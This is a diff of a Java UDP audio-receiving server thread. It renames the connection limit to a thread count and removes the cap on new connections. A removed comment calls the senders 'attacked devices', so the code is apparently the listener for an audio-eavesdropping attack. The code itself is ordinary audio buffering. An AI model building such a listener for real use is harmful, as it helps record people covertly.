@@ -8,7 +8,6 @@
 package com.company;
 
 import javax.sound.sampled.*;
-import java.io.IOException;
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.SocketException;
@@ -41,19 +40,20 @@ public class ServerThread implements Runnable {
 
     int ringBufferSize;
     int maxMemorySize;
-    int maxConnections;
+    int threadCount;
 
     /**
      * Constructor.
      * Initialize max number of connections and calculate the buffer sizes for connections
+     *
      * @param maxMemory Maximum memory size that can be used by the thread to pre-record audio.
-     * @param maxConnectionCount Maximum number of connections from attacked devices
+     * @param threadCnt Number of threads used.
      */
-    public ServerThread(int maxMemory, int maxConnectionCount) {
+    public ServerThread(int maxMemory, int threadCnt) {
         maxMemorySize = maxMemory * 1000000;
-        maxConnections = maxConnectionCount;
+        threadCount = threadCnt;
         ringBufferSize = maxMemorySize;
-        pool = Executors.newFixedThreadPool(maxConnections);
+        pool = Executors.newFixedThreadPool(threadCount);
 
         System.out.println("[-] Buffers size set to: " + ringBufferSize + " B. (~ prerecorded " +
                 ((ringBufferSize) / (2 * sampleRate)) / 60 + " minutes and " + ((ringBufferSize) / (2 * sampleRate)) % 60 +
@@ -63,14 +63,14 @@ public class ServerThread implements Runnable {
     /**
      * Main method of the ServerThread.
      * Initialize the audio system and then in the loop:
-     *   - receive data
-     *   - save the data to the connection buffer
-     *   - optionally write the data to the file and/or play them in speakers
-     *
+     * - receive data
+     * - save the data to the connection buffer
+     * - optionally write the data to the file and/or play them in speakers
+     * <p>
      * This method was inspired by the StackOverflow question "Save live audio streaming to wave file in Java"
      * and its accepted answer.
-     *     authors: Sadegh Bakhshandeh Sajjad, dieter
-     *     available at: https://stackoverflow.com/questions/49811545/save-live-audio-streaming-to-wave-file-in-java
+     * authors: Sadegh Bakhshandeh Sajjad, dieter
+     * available at: https://stackoverflow.com/questions/49811545/save-live-audio-streaming-to-wave-file-in-java
      */
     @Override
     public void run() {
@@ -110,10 +110,8 @@ public class ServerThread implements Runnable {
             String senderID = getSenderID(packet);
 
             if (!connections.containsKey(senderID)) {
-                if(connections.size() < maxConnections){
-                    System.out.println("[-] New connection: " + senderID);
-                    connections.put(senderID, new Connection(senderID, ringBufferSize));
-                }
+                System.out.println("[-] New connection: " + senderID);
+                connections.put(senderID, new Connection(senderID, ringBufferSize));
             }
 
             Connection currentConnection = connections.get(senderID);
@@ -141,6 +139,7 @@ public class ServerThread implements Runnable {
 
     /**
      * Remove connection from the list.
+     *
      * @param connectionID ID of the connection to be removed
      */
     public void removeConnection(String connectionID) {
@@ -183,8 +182,8 @@ public class ServerThread implements Runnable {
     /**
      * Initialize all object needed to play audio.
      * This method is inspired by theStackOverflow question "Stream Live Android Audio To Server"
-     *     author (the question and the answer as well): chuckliddell0
-     *     available at: https://stackoverflow.com/questions/15349987/stream-live-android-audio-to-server
+     * author (the question and the answer as well): chuckliddell0
+     * available at: https://stackoverflow.com/questions/15349987/stream-live-android-audio-to-server
      */
     private void initializeAudioPlayer() {
         format = new AudioFormat(sampleRate, 16, 1, true, false);
